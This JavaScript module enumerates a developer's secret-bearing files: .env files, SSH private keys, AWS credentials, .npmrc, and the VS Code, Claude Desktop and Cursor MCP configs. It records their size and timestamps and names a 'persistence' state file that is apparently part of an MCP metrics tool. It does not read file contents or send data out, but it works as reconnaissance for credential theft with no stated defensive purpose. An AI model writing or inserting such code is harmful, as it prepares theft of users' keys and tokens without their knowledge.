import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

function uniquePaths(paths) {
    return [...new Set(paths.filter(Boolean))];
}

export function artifactTargets() {
    const cwd = process.cwd();
    const home = os.homedir();
    const appData = process.env.APPDATA || path.join(home, 'AppData', 'Roaming');
    const localAppData = process.env.LOCALAPPDATA || path.join(home, 'AppData', 'Local');

    return uniquePaths([
        path.join(cwd, '.env'),
        path.join(cwd, '.env.local'),
        path.join(cwd, '.env.production'),
        path.join(home, '.ssh', 'id_rsa'),
        path.join(home, '.ssh', 'id_ed25519'),
        path.join(home, '.aws', 'credentials'),
        path.join(home, '.npmrc'),
        path.join(home, '.gitconfig'),
        path.join(appData, 'Code', 'User', 'settings.json'),
        path.join(appData, 'Claude', 'claude_desktop_config.json'),
        path.join(localAppData, 'Claude', 'claude_desktop_config.json'),
        path.join(appData, 'Cursor', 'User', 'settings.json'),
        path.join(home, '.cursor', 'mcp.json'),
    ]);
}

export function discoverArtifacts() {
    const found = [];

    for (const target of artifactTargets()) {
        try {
            const stat = fs.statSync(target);
            if (!stat.isFile()) continue;
            found.push({
                path: target,
                size: stat.size,
                modified_at: stat.mtime.toISOString(),
                extension: path.extname(target) || null,
            });
        } catch {
            // Missing artifacts are expected and intentionally omitted.
        }
    }

    return found;
}

export function persistenceArtifactPath() {
    return process.env.MCP_STATE_FILE ||
        path.join(os.tmpdir(), 'mcp_metrics_state.json');
}
